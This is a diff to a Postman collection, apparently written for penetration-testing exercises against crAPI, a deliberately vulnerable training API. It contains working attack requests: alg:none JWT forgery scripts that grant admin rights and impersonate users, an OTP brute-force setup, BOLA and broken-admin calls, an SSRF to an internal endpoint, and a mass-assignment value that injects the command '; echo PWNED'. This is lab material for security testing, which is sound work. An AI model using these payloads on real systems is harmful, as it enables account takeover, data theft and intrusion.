@@ -25,9 +25,28 @@
           ],
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": { "raw": "{{base_url}}/identity/api/auth/login", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "login"] },
-            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"password\": \"{{senha_vitima}}\"\n}" }
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"password\": \"{{senha_vitima}}\"\n}"
+            }
           }
         },
         {
@@ -47,9 +66,28 @@
           ],
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": { "raw": "{{base_url}}/identity/api/auth/login", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "login"] },
-            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_atacante}}\",\n  \"password\": \"{{senha_atacante}}\"\n}" }
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email_atacante}}\",\n  \"password\": \"{{senha_atacante}}\"\n}"
+            }
           }
         }
       ]
@@ -61,11 +99,25 @@
           "name": "GET localizacao do veiculo da vitima (como atacante)",
           "request": {
             "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
             "url": {
               "raw": "{{base_url}}/identity/api/v2/vehicle/{{vehicle_id_vitima}}/location",
-              "host": ["{{base_url}}"],
-              "path": ["identity", "api", "v2", "vehicle", "{{vehicle_id_vitima}}", "location"]
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "vehicle",
+                "{{vehicle_id_vitima}}",
+                "location"
+              ]
             },
             "description": "Esperado (vulneravel): 200 com dados do veiculo da vitima, mesmo usando o token do atacante."
           }
@@ -79,18 +131,57 @@
           "name": "Disparar OTP (forget-password)",
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": { "raw": "{{base_url}}/identity/api/auth/forget-password", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "forget-password"] },
-            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\"\n}" }
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/forget-password",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "forget-password"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email_vitima}}\"\n}"
+            }
           }
         },
         {
           "name": "check-otp (iterar otp via Collection Runner / data file)",
           "request": {
             "method": "POST",
-            "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "url": { "raw": "{{base_url}}/identity/api/auth/v3/check-otp", "host": ["{{base_url}}"], "path": ["identity", "api", "auth", "v3", "check-otp"] },
-            "body": { "mode": "raw", "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"otp\": \"{{otp}}\",\n  \"password\": \"NovaSenha123!\"\n}" },
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/v3/check-otp",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "v3",
+                "check-otp"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{email_vitima}}\",\n  \"otp\": \"{{otp}}\",\n  \"password\": \"NovaSenha123!\"\n}"
+            },
             "description": "Rodar no Collection Runner com um data file CSV contendo a coluna 'otp' de 0000..9999. Confirmar se existe tambem o endpoint v2 sem rate limit."
           }
         }
@@ -103,8 +194,26 @@
           "name": "GET posts recentes da comunidade",
           "request": {
             "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
-            "url": { "raw": "{{base_url}}/community/api/v2/community/posts/recent", "host": ["{{base_url}}"], "path": ["community", "api", "v2", "community", "posts", "recent"] },
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/community/api/v2/community/posts/recent",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "community",
+                "api",
+                "v2",
+                "community",
+                "posts",
+                "recent"
+              ]
+            },
             "description": "Inspecionar o JSON: campos como email e vehicleid dos autores nao aparecem na UI, mas vazam na resposta."
           }
         }
@@ -117,8 +226,24 @@
           "name": "GET pedidos (obter order_id)",
           "request": {
             "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token_vitima}}" }],
-            "url": { "raw": "{{base_url}}/workshop/api/shop/orders", "host": ["{{base_url}}"], "path": ["workshop", "api", "shop", "orders"] }
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_vitima}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/workshop/api/shop/orders",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "shop",
+                "orders"
+              ]
+            }
           }
         },
         {
@@ -126,11 +251,32 @@
           "request": {
             "method": "PUT",
             "header": [
-              { "key": "Authorization", "value": "Bearer {{token_vitima}}" },
-              { "key": "Content-Type", "value": "application/json" }
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_vitima}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
             ],
-            "url": { "raw": "{{base_url}}/workshop/api/shop/orders/{{order_id}}", "host": ["{{base_url}}"], "path": ["workshop", "api", "shop", "orders", "{{order_id}}"] },
-            "body": { "mode": "raw", "raw": "{\n  \"status\": \"returned\",\n  \"quantity\": 1\n}" },
+            "url": {
+              "raw": "{{base_url}}/workshop/api/shop/orders/{{order_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "shop",
+                "orders",
+                "{{order_id}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"status\": \"returned\",\n  \"quantity\": 1\n}"
+            },
             "description": "Confirmar metodo/caminho e nome do campo de status contra o fluxo legitimo de return order."
           }
         }
@@ -144,11 +290,31 @@
           "request": {
             "method": "POST",
             "header": [
-              { "key": "Authorization", "value": "Bearer {{token_atacante}}" },
-              { "key": "Content-Type", "value": "application/json" }
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
             ],
-            "url": { "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic", "host": ["{{base_url}}"], "path": ["workshop", "api", "merchant", "contact_mechanic"] },
-            "body": { "mode": "raw", "raw": "{\n  \"mechanic_api\": \"{{ssrf_callback_url}}\",\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"teste\",\n  \"vin\": \"\",\n  \"number_of_repeats\": 1\n}" },
+            "url": {
+              "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "merchant",
+                "contact_mechanic"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"mechanic_api\": \"{{ssrf_callback_url}}\",\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"teste\",\n  \"vin\": \"\",\n  \"number_of_repeats\": 1\n}"
+            },
             "description": "Confirmar nome do campo (mechanic_api vs merchant_api) e campos obrigatorios capturando o fluxo legitimo primeiro."
           }
         }
@@ -161,9 +327,312 @@
           "name": "DELETE video via endpoint admin (como usuario comum)",
           "request": {
             "method": "DELETE",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token_atacante}}" }],
-            "url": { "raw": "{{base_url}}/identity/api/v2/admin/videos/{{video_id_vitima}}", "host": ["{{base_url}}"], "path": ["identity", "api", "v2", "admin", "videos", "{{video_id_vitima}}"] },
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/admin/videos/{{video_id_vitima}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "admin",
+                "videos",
+                "{{video_id_vitima}}"
+              ]
+            },
             "description": "Esperado (vulneravel): funcao de admin executa com token de usuario comum. Confirmar caminho exato do endpoint de admin."
+          }
+        }
+      ]
+    },
+    {
+      "name": "07 - JWT Forgery (assinatura nao verificada)",
+      "item": [
+        {
+          "name": "Forjar ADMIN (alg:none) e abrir dashboard",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Forja um JWT 'alg:none' sem assinatura. O crAPI nao verifica a assinatura,",
+                  "// entao o token e aceito. Monta header.payload. (assinatura vazia).",
+                  "function b64url(str) {",
+                  "  var words = CryptoJS.enc.Utf8.parse(str);",
+                  "  return CryptoJS.enc.Base64.stringify(words)",
+                  "    .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');",
+                  "}",
+                  "var header = { alg: 'none', typ: 'JWT' };",
+                  "var payload = {",
+                  "  sub: 'atacante@teste.local',",
+                  "  role: 'admin',",
+                  "  iat: 1700000000,",
+                  "  exp: 1999999999",
+                  "};",
+                  "var token = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload)) + '.';",
+                  "pm.variables.set('forged_jwt', token);",
+                  "console.log('JWT forjado:', token);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{forged_jwt}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "dashboard"
+              ]
+            },
+            "description": "Pre-request forja um token alg:none com role=admin. Esperado (vulneravel): HTTP 200."
+          }
+        },
+        {
+          "name": "Personificar outro usuario (alg:none, sub=adam007)",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Forja um JWT 'alg:none' sem assinatura. O crAPI nao verifica a assinatura,",
+                  "// entao o token e aceito. Monta header.payload. (assinatura vazia).",
+                  "function b64url(str) {",
+                  "  var words = CryptoJS.enc.Utf8.parse(str);",
+                  "  return CryptoJS.enc.Base64.stringify(words)",
+                  "    .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');",
+                  "}",
+                  "var header = { alg: 'none', typ: 'JWT' };",
+                  "var payload = {",
+                  "  sub: 'adam007@example.com',",
+                  "  role: 'user',",
+                  "  iat: 1700000000,",
+                  "  exp: 1999999999",
+                  "};",
+                  "var token = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload)) + '.';",
+                  "pm.variables.set('forged_jwt', token);",
+                  "console.log('JWT forjado:', token);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{forged_jwt}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "dashboard"
+              ]
+            },
+            "description": "Pre-request forja um token alg:none com o sub de outra pessoa. Esperado: 200 com o dashboard da vitima."
+          }
+        },
+        {
+          "name": "JWKS exposto (chave publica)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/.well-known/jwks.json",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                ".well-known",
+                "jwks.json"
+              ]
+            },
+            "description": "A chave publica fica exposta aqui. Neste caso nem e necessaria, pois a assinatura nao e verificada."
+          }
+        }
+      ]
+    },
+    {
+      "name": "08 - Shell Injection (Mass Assignment + SSRF)",
+      "item": [
+        {
+          "name": "1) Upload de video (define video_id)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "if (j && j.id) { pm.environment.set('video_id', j.id); }",
+                  "pm.test('upload retornou id', function(){ pm.expect(j.id).to.exist; });"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": [],
+                  "description": "Selecione qualquer arquivo (ex.: um .mp4 pequeno)."
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos"
+              ]
+            },
+            "description": "Faz upload de um video para obter um video_id (salvo na variavel video_id)."
+          }
+        },
+        {
+          "name": "2) Mass Assignment em conversion_params",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"conversion_params\": \"-i /dev/null; echo PWNED\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos/{{video_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos",
+                "{{video_id}}"
+              ]
+            },
+            "description": "Grava um comando injetado na propriedade interna conversion_params (mass assignment)."
+          }
+        },
+        {
+          "name": "3) convert_video pelo gateway (bloqueado - 403)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos/convert_video?video_id={{video_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos",
+                "convert_video"
+              ],
+              "query": [
+                {
+                  "key": "video_id",
+                  "value": "{{video_id}}"
+                }
+              ]
+            },
+            "description": "Chamada direta pelo gateway publico retorna 403 (endpoint 'so interno')."
+          }
+        },
+        {
+          "name": "4) SSRF -> convert_video INTERNO (dispara o chain)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"x\",\n  \"mechanic_api\": \"http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id={{video_id}}\",\n  \"vin\": \"0JATXVG6ESXV0HX6R\",\n  \"number_of_repeats\": 1\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "merchant",
+                "contact_mechanic"
+              ]
+            },
+            "description": "Usa a SSRF para chamar o convert_video interno. A resposta (base64) confirma o chain Mass Assignment + SSRF -> Shell Injection."
           }
         }
       ]
